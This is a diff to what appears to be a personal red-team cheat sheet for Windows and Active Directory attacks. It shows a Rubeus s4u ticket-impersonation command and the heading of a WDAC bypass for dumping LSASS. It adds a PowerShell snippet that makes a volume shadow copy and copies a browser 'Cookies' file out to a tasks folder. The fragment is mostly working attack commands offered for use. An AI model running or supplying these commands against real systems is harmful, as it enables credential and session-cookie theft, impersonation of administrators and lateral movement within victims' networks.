@@ -1226,6 +1226,16 @@ unconstrained delegation ADDON: USING /ALTSERVICE
 # MUST be rubeus minimum version 1.6.1 (alr in html)
 .\r.exe s4u /impersonateuser:administrator /ticket:B64TICKET /altservice:cifs/server.DOMAIN.local /self /ptt
 ```
+volume shadow copy quickie
+```
+$Path = "C:\path\containing\file\you\want\to\copy"
+$directoryRoot = [System.IO.Directory]::GetDirectoryRoot($Path).ToString()
+
+$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create($directoryRoot, "ClientAccessible")
+$shadowCopy = Get-WmiObject Win32_ShadowCopy | ? { $_.ID -eq $shadow.ShadowID }
+$snapshotPath = $shadowCopy.DeviceObject + "\" + $Path.Replace($directoryRoot, "")
+cmd /c copy "$($snapshotPath)Cookies\" c:\windows\tasks\out.txt
+```
 wdac bypass (lolbas + pypykatz -> dump lsass) [sauce](https://lolbas-project.github.io/lolbas/Libraries/comsvcs/)
 ```
 # first find lsass pid
